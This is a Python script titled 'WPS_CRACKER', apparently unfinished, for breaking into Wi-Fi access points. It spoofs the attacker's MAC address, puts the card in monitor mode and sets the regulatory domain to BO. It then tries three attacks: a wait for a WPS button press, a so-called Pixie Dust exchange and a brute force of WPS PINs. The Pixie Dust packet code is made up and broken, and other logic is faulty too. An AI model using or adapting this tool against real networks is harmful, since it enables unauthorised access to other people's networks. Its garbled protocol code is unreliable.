############# WORK IN PROGRESS ###############

import time
import random

import os
import re

import subprocess
from subprocess import call
from scapy.all import * #pip install scapy
import hashlib
import wpa_supplicant #pip install wpa_supplicnat
from uuid import uuid4
import wifi #pip install wifi

from termcolor import colored #pip install termcolor (no se si es necesario)

DN = open(os.devnull, 'w')

conected = False

print(colored("\n\n\n#                  #   ######    ######          #      #   ########       #       #      #   ########   #       #", 'red', attrs=['blink']),
      colored("\n #                #    #     #  #      #         #     #    #       #     # #      #     #    #          # #     #", 'red', attrs=['blink']),
      colored("\n  #              #     #     #  ##               #    #     #       #    #   #     #    #     #          #  #    #", 'red', attrs=['blink']),
      colored("\n   #      #     #      ######    ######          #  #       ########    #     #    #  #       #####      #   #   #", 'red', attrs=['blink']),
      colored("\n    #    # #   #       #               #         #  #       #    #     # ##### #   #  #       #          #    #  # ", 'red', attrs=['blink']),
      colored("\n     #  #   # #        #        #     ##         #    #     #     #    #       #   #    #     #          #     # #", 'red', attrs=['blink']),
      colored("\n      #      #         #         ######          #      #   #      #   #       #   #      #   ########   #       #", 'red', attrs=['blink']),
      colored("\n\n\n                    ⠀⠀⠀⠀⠀⠀ ⠀ ⠀⠀⠀⠀⠀  ⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⠀⠀⠀                           ", 'red', attrs=['blink']),
      colored("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                     ⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀                         ", 'red', attrs=['blink']),
      colored("\n                    ⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀                       ", 'red', attrs=['blink']),
      colored("\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡿⠿⢿⣿⣷⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⣷⣠⣴⣶⣶⣤⡀⠀            ", 'red', attrs=['blink']),
      colored("\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⡄⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣟⠉⢹⣿⣷⠀⠀⠀          ", 'red', attrs=['blink']),
      colored("\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠿⠿⠿⠋⠀⠀⠀         ⠀", 'red', attrs=['blink']),
      colored("\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⣿⣿⣧⠀                  ", 'red', attrs=['blink']),
      colored("\n                    ⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⣰⣿⣿⡟⠁⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠈⢿⣿⣷⡄⠀               ", 'red', attrs=['blink']),
      colored("\n                    ⠀⣴⣾⣿⣿⣿⣿⣶⡀⢀⣾⣿⣿⠋⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠹⣿⣿⣦⠀              ", 'red', attrs=['blink']),
      colored("\n                    ⢸⣿⡁⠀⠀⢀⣿⣿⢇⣾⣿⣿⠃⠀⠀⠀⠀⠀⠀⣿⡈⠙⢿⣿⣿⣿⠿⠋⢩⡇⠀⠀⠀⠀⠀⠀⠙⣿⣿⣇⠀⠀⠀           ", 'red', attrs=['blink']),
      colored("\n                    ⠈⠛⠛⣠⣴⣿⡿⠋⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⣿⣿⣶⣾⣿⣿⣿⣷⣶⣿⡇⠀⠀⠀⠀⠀⠀⠀⣻⣿⣿⠀             ", 'red', attrs=['blink']),
      colored("\n                    ⠀⣠⣾⣿⡿⠋⠀⠀⢻⣿⣿⣷⡀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⢠⣿⣿⣏⣠⣤⣶⣤⠀⠀     ⠀", 'red', attrs=['blink']),
      colored("\n                    ⢰⣿⣿⣟⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣴⣿⣿⣿⣿⠋⠀⠀⠀⠀       ", 'red', attrs=['blink']),
      colored("\n                    ⢸⣿⣿⣿⣦⣄⣀⠀⠀⠀⠉⠙⠛⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⢻⣿⣄⠀⠀        ⠀", 'red', attrs=['blink']),
      colored("\n                    ⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⢿⣿⣶⣄⠀⠀⠀   ⠀⠀", 'red', attrs=['blink']),
      colored("\n                    ⠀⠀⠀⠀⠈⠉⠉⠙⠛⠛⠛⠛⠛⣿⣿⣿⣿⠟⢋⣿⣿⣿⡿⠋⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠙⢿⣿⣧⡀⠀      ", 'red', attrs=['blink']),
      colored("\n                     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠟⠁⠀⣿⣿⣿⠟⠀⠀⢀⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠈⢿⣿⣷⠀⠀⠀    ", 'red', attrs=['blink']),
      colored("\n                     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⠏⠀⠀⢸⣿⣿⣿⠀⠀⠀⢸⣿⣿⣿⠀⠈⢻⣿⣿⣿⢿⣿⣿⣦⡀⠀⠀⠀⣸⣿⣿⠀⣀⡄    ", 'red', attrs=['blink']),
      colored("\n                    ⠀ ⠀⠀⠀⠀ ⠀⠀⠀⣰⣿⣿⡟⠀⠀⠀⠸⣿⣿⣿⠀⠀⠀⢻⣿⣿⣿⠀⠀⠀⢻⣿⣿⡆⠹⢿⣿⣿⣶⣶⣾⣿⣿⣿⣿⠋⠀     ", 'red', attrs=['blink']),
      colored("\n                    ⠀⠀⠀⠀⠀⠀ ⢀⣴⣿⣿⡿⠁⠀⠀ ⠀⠀⢿⣿⣿⡆⠀⠀⠸⣿⣿⣿⡄⠀⠀⠀⢿⣿⣿⠀⠀⠙⠛⠿⠿⠿⠛⠋⢸⣿⠀⠀     ", 'red', attrs=['blink']),
      colored("\n                    ⠀⠀ ⠀⠀⣠⣴⣿⣿⡿⠛⠁⠀⠀⠀ ⠀⠀⠘⣿⣿⣿⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀     ", 'red', attrs=['blink']),
      colored("\n                     ⠀⢠⣶⣿⣿⠿⠋⠁⠒⠛⢻⣷⠀⠀ ⠀⠀⠀⢹⣿⣿⡇⠀⣠⣿⣿⣿⢃⣴⣿⠟⠛⢿⣿⣿⡄⠀⠀⠀⠀⠀⠀⢠⣿⣿⠀⠀    ", 'red', attrs=['blink']),
      colored("\n                   ⠀⠀⢰⣿⣿⠟⠁⠀⠀⠀⠀⢀⣾⡟⠀⠀ ⠀⠀⠀⠘⣿⣿⣧⣾⣿⣿⠟⠁⣾⣿⡇⠀⠀⠘⢿⣿⣿⣦⡀⠀⠀⣀⣴⣿⣿⠃⠀     ", 'red', attrs=['blink']),
      colored("\n                  ⠀ ⠀⣿⣿⡇⠀⠀⢀⡄⠀⢠⣿⣿⠀⠀⠀⠀ ⠀⠀⢰⣿⣿⣿⣿⠟⠁⠀⠀⢿⣿⣇⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀      ", 'red', attrs=['blink']),
      colored("\n                  ⠀⠀ ⠹⣿⣷⣄⣀⣼⡇⠀⢸⣿⣿⡀⠀⠀ ⠀⣠⣿⣿⣿⡿⠋⠀⠀ ⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀      ", 'red', attrs=['blink']),
      colored("\n                  ⠀⠀⠀ ⠈⠛⠛⠛⠋⠀⠀⠀⢻⣿⣿⣶⣶⣶⣿⣿⣿⣿⣿⠁⠀⠀⠀ ⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀              ", 'red', attrs=['blink']),
      colored("\n                  ⠀ ⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠛⠛⠛⠉⣿⣿⣿⡀⠀⠀⠀⠀ ⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀                   ", 'red', attrs=['blink']),
      colored("\n                   ⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠸⣿⣿⣷⣄⣀  ⢀⣀⣴⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      ⠀⠀⠀⠀", 'red', attrs=['blink']),
      colored("\n                  ⠀ ⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀                 ⠀⠀⠀", 'red', attrs=['blink']),
      colored("\n⠀⠀⠀⠀⠀⠀⠀                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      ⠀", 'red', attrs=['blink']),)
                
print(colored("\n####   WPS_CRACKER   ####", 'red'))
print(colored("Made by: Airil\n", 'cyan'))
print(colored("I am not responsible for the misuse that may be given to this tool!\n\n", 'red', attrs=['reverse', 'blink', 'dark', 'dark']))

time.sleep(1)
call("ifconfig", shell=True)

iitext = str(colored("[-] Net Interface name: ", 'yellow'))
iface = input(iitext)
ifconfig_result = subprocess.check_output(["ifconfig", iface])
macSearch = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result))
realMac = ""
if macSearch:
    realMac = macSearch.group(0)
    print(colored("[+]", 'green'), "Real MAC:", colored(str(realMac), 'cyan'))
        
def change_mac(iface, option):
    ifconfig_result2 = subprocess.check_output(["ifconfig", iface])
    macSearch2 = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result2))
    realMac2 = ""
    if macSearch2:
        realMac2 = macSearch2.group(0)
    
    if option == "new" and realMac2 == realMac:
        print("\n" + colored("[+]", 'green'), "Setting a new MAC...")
        chars = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f"]
        newMAC = "00:"
        for i in range(4):
            for a in range(2):
                newMAC += chars[random.randint(0,15)]
            newMAC += ":"
        for a in range(2):
            newMAC += chars[random.randint(0,15)]
        print(colored("[+]", 'green'), "new temporal MAC:", colored(str(newMAC), 'cyan'))
        
        call(["ifconfig", iface, "down"], stdout=DN, stderr=DN)
        call(["ifconfig", iface, "hw", "ether", newMAC])
        call(["ifconfig", iface, "up"], stdout=DN, stderr=DN)
    
    elif option == "old":
        print(colored("[+]", 'green'), "Setting old MAC...")
        call(["ifconfig", iface, "down"], stdout=DN, stderr=DN)
        call(["ifconfig", iface, "hw", "ether", realMac], stdout=DN, stderr=DN)
        call(["ifconfig", iface, "up"], stdout=DN, stderr=DN)

def enable_monitor_mode(iface):
    print("\n" + colored("[+]", 'green'), "Starting monitor mode...")
    change_mac(iface, "new")
    call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)
    call(['iw', 'reg', 'set', 'BO'], stdout=DN, stderr=DN)
        
def disable_monitor_mode(iface):
    print(colored("[+]", 'green'), "Disabling monitor mode...")
    call(['airmon-ng', 'stop', iface], stdout=DN, stderr=DN)
    call(["service", "network-manager", "start"], stdout=DN, stderr=DN)
    change_mac(iface, "old")

def checks():
    print("\n" + colored("[+]", 'green'), "Checking requeriments... ")
    if str(subprocess.check_output(["which", "aircrack-ng"])) != "":
        print(colored("[+]", 'green'), "Aircrack installed")
    else:
        print(colored("[+]", 'green'), "Instaling aircrack-ng...")
        call(["apt-get", "install", "aircrack-ng", "-Y"])
        print(colored("[+]", 'green'), "Aircrack installed")
    if str(subprocess.check_output(["which", "wireshark"])) != "":
        print(colored("[+]", 'green'), "Wireshark installed")
    else:
        print(colored("[+]", 'green'), "Instaling wireshark...")
        call(["apt-get", "install", "wireshark", "-Y"])
        
def simpleWPSconect(conected, target):
    print(colored("\n[+]", 'green'), "Starting", colored("pasive", 'green'), "wps attack:")
    ptitext = str(colored("[-] How many time do you want to stay waiting ", 'yellow') + colored("(in minutes, for example: 10): ", 'cyan'))
    pasiveTime = int(input(ptitext))
    print(colored("[+]", 'green'), "Waiting for someone puss the wps button...")
    
    t = int(pasiveTime*60)
    t2 = int(t/50)
    cords1 = "\x1B[0K"
    
    for i in range(t2):
        tx1 = colored("[+] ", 'green')
        counter1 = colored("[00:00.00]", 'cyan')
        
        call(["wpa_cli", "wps_pbc", target], stdout=DN, stderr=DN)
        checkSconect = subprocess.check_output(["wpa_cli", "wps_pbc", target])
        checker1 = str('b"Selected interface ' + "'" + iface + "'" + r'\nOK\n"')
        
        if str(checkSconect) == checker1:
            conected = True
            print(colored("[+] CONECTED!", 'green'))
            break
        
        print("\n")
        
        if i != t2-1 and conected == False:
            t = 0
            while True:
                t += 1
                counter1 = colored(str(t), 'cyan')
                print(f'{cords1}{tx1}{counter1} Trying to conect WPS...')
                time.sleep(1)
                if t == 50:
                    break

        print("\n")

    if conected == False:
        print(colored("[!] Unable to connect to this network! ", 'red'))
               
def pixieDust(target, iface, essid):
    try:
        pin_int = "-1"
        #### SEND M1 PACKAGE
        ifconfig_result = subprocess.check_output(["ifconfig", iface])
        src_mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result)) # local mac
        
        titext = str(colored("[-] Target ", 'yellow') + colored("chain (for example: 11)", 'cyan') + colored(":", 'yellow'))
        channel = int(input(titext))

        # M1 package data
        wps_info = wpa_supplicant.get_wps_info(iface)
        wps_version = re.search(r"Version:\s+(\d+)", wps_info).group(1)
        wps_version1 = "WPSVersion=0x10"
        if wps_version == "2":
            "WPSVersion=0x20"
            
        cells = wifi.Cell.all(iface)
        ap = cells.filter(lambda cell: cell.ssid == essid)[0]
        uuid = ap.uuid
        
        pixie_data = wps_version1 + \
                    " MsgType=0x00" + \
                    " UUID-E=" + uuid4().hex[:14] + \
                    " UUID=" + str(uuid) + \
                    " E-Hash1=" + hashlib.sha256(src_mac.encode()).hexdigest() + \
                    " AuthKey=" + hashlib.sha256((uuid4().hex[:14] + hashlib.sha256(src_mac.encode()).hexdigest()).encode()).hexdigest()

        # create M1 package
        print(colored("[+] ", 'green'), "Sending", colored("M1", 'yellow'), "package...")
        m1_packet = scapy.RadioTap() / scapy.Dot11(type=0, subtype=4, addr1=target, addr2=src_mac, addr3=target) / scapy.Dot11Beacon(cap="ESS+privacy") / scapy.Dot11Elt(ID="SSID", info=essid) / scapy.Dot11Elt(ID="vendor", info=pixie_data)
        sendp(m1_packet, iface=iface, count=1, inter=0.1) # send M1 package from the iface

        #### RECEIVE M2 PACKAGE
        print(colored("[+] ", 'green'), "Reciving", colored("M2", 'yellow'), "package...")
        filter = "ether src " + ap.address + " and dot11Mgt.type == 0 and dot11Mgt.subtype == 5 and dot11Mgt.info == 'P\x00\x00\x00\x00\x00\x00\x00\x00'"
        m2_packet = sniff(iface=iface, filter=filter, count=1)[0] # capture M2 package
        
        #### SEND M3 PACKAGE
        print(colored("[+] ", 'green'), "Sending", colored("M3", 'yellow'), "package...")
        pixie_data = wps_version1 + \
                    " MsgType=0x04" + \
                    " Authenticator=" + hashlib.sha256((uuid4().hex[:14] + hashlib.sha256(src_mac.encode()).hexdigest()).encode()).hexdigest() + \
                    " E-Hash2=" + hashlib.sha256(m2_packet[scapy.Dot11Elt][0].payload[37:41]).hexdigest()

        # create M3 package
        m3_packet = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=m2_packet.addr2, addr2=m2_packet.addr1, addr3=m2_packet.addr1) / scapy.Dot11Elt(ID="vendor", info=pixie_data)
        sendp(m3_packet, iface=iface, count=1, inter=0.1) # send M3 package from the iface

        #### RECEIVE M4 PACKAGE
        print(colored("[+] ", 'green'), "Reciving", colored("M4", 'yellow'), "package...")
        filter = "ether src " + ap.address + " and dot11Mgt.type == 0 and dot11Mgt.subtype == 5 and dot11Mgt.info == 'P\x00\x00\x00\x00\x00\x00\x00\x00'"
        m4_packet = sniff(iface=iface, filter=filter, count=1)[0] # capture M4 package

        pixie_data = m4_packet[scapy.Dot11Elt][0].payload
        pin_hex = pixie_data[15:23] # extract PIN from payload
        pin_int = int(pin_hex, 16) % 10000000 # convert PIN from hex to int

        print(colored("[+]", 'green'), "PIN WPS found: " + colored(str(pin_int), 'cyan'))
        return(str(pin_int))
    except:
        return("-1")
            
def printPassword(pin):
    pass
                    
def brute_force_WPS(target, conected):
    checker2 = str('b"Selected interface ' + "'" + iface + "'" + r'\nFAIL\n"')
    
    generic_pins = ("00000000", "11111111", "12345670", "12349876", "98765432", "12345678")
    print(colored("[+] ", 'green') + "Trying " + colored("generic PINS...", 'green'))
    
    for i in range(len(generic_pins)):
        checkGconect = str(subprocess.check_output(["wpa_cli", "wps_pin", generic_pins[i], target]))
        if checkGconect != checker2:
            call(["wpa_cli", "wps_pin", generic_pins[i], target])
            print(colored("[+] CONECTED! ", 'green') + "PIN: " + colored(generic_pins[i], 'cyan'))
            conected = True
            break

    if conected == False:
        print(colored("[+] ", 'green'), "Starging brute force...")
        for i in range(0,99999999):
            rawPIN = str(i)
            OtoAdd = int(8 - len(rawPIN))
            pin = str(rawPIN.zfill(OtoAdd)) 
            checkBFconect = str(subprocess.check_output(["wpa_cli", "wps_pin", pin, target]))
            if checkBFconect != checker2:
                call(["wpa_cli", "wps_pin", pin, target], stdout=DN, stderr=DN)
                print(colored("[+] CONECTED! ", 'green') + "PIN: " + colored(pin, 'cyan'))
                conected = True
                return(pin)
                break
    
    if conected == False:
        print(colored("[!] Unable to connect to this network! ", 'red') + colored("The network is ", 'yellow') + colored("secure ", 'green') + colored("against ", 'yellow') + colored("WPS ", 'red') + colored("attacks!", 'yellow'))
        return("NOPE")

if os.getuid() == 0 and os.uname()[0].startswith("Linux"):
    checks()
    
    while True:
        pin = "NOPE"
        conected = False
        
        call(['airmon-ng', 'stop', iface], stdout=DN, stderr=DN)
        call(["service", "network-manager", "start"], stdout=DN, stderr=DN)
        time.sleep(3)
        
        print("\n")
        print(call(["nmcli", "device", "wifi", "list"]))
        print("\n")
        
        enable_monitor_mode(iface)
        
        oitext = str(colored("[-] What do yoy what do do ", 'yellow') + colored("(attack, change_mac, exit, help): ", 'cyan'))
        option = input(oitext).lower()
        
        if option == "attack":
            o2itext = str(colored("[-] Attack option ", 'yellow') + colored("(pasive, active): ", 'cyan'))
            option2 = input(o2itext)
            
            if option2 == "pasive":
                titext = str(colored("[-] Target ", 'yellow') + colored("SSID", 'cyan') + colored(":", 'yellow'))
                target = input(titext)
                simpleWPSconect(conected, target)
            
            elif option2 == "active":
                titext = str(colored("[-] Target ", 'yellow') + colored("BSSID", 'cyan') + colored(":", 'yellow'))
                target = input(titext)
                titext = str(colored("[-] Target ", 'yellow') + colored("ESSID", 'cyan') + colored(":", 'yellow'))
                essid = input(titext)
                pixiePasswd = pixieDust(target, iface, essid)
                if pixiePasswd == "-1":
                    print(colored("[!] Unable to connect with PixieDust! ", 'red') + colored("Trying other things...", 'yellow'))
                    pin = brute_force_WPS(target, conected)
                else:
                    call(["wpa_cli", "wps_pin", pixiePasswd, target], stdout=DN, stderr=DN)
                    print(colored("[+] CONECTED! ", 'green') + "PIN: " + colored(pin, 'cyan'))
                                
                if pin != "NOPE":
                    printPassword(pin)
            else:
                print(colored("\n[!] ERROR", 'red') + colored(" something was wrong, please ", 'yellow') + colored("try again", 'red'))
            
        elif option == "exit":
            break
        
        elif option == "change_mac":
            change_mac(iface, "new")
        
        elif option == "help":
            print(colored("\n\nHELP", 'green', attrs=["reverse", "blink"]),
                  colored("\nPasive Attack:", 'green', attrs=["underline"]),
                  "\nIn this option you specify how long you want to be waiting for someone to press the WPS button of the AP you want to attack. During that time every 50 seconds a request will be made to connect to that network and if the button has been pressed you will connect directly without providing PIN or Password. The request is made every 50s since the time there is to connect since you press the button is 60-120s, depends on the AP.",
                  colored("\n\nActive Attack:", 'green', attrs=["underline"]),
                  "\nIn this mode, several things are tested to try to get the PIN in the shortest possible time. First, predefined PIN-s that many AP-s usually have are tested. The Pixie Dust vulnerability is then tested. And finally, if none of the above has worked, brute force is made of all possible PIN-s.",
                  colored("\n\nChange MAC:", 'green', attrs=["underline"]),
                  "\nWith this option we can change the MAC in case we want to put another, but since the program starts the mac is changed and the original is saved to put it back once the tool is closed, so this option is not entirely necessary.\n\n\n")
        
        else:
            print(colored("\n[!] ERROR", 'red') + colored(" something was wrong, please ", 'yellow') + colored("try again", 'red'))
            
    disable_monitor_mode(iface)
    
else:
    if not os.uname()[0].startswith("Linux"):
        print(colored("[!]" + 'red') + colored(" This tool only work in ", 'yellow') + colored("linux", 'red'))
    else:
        print("\n" + colored("[!] Login as Root ", 'red') + colored("and try again\n", 'yellow'))
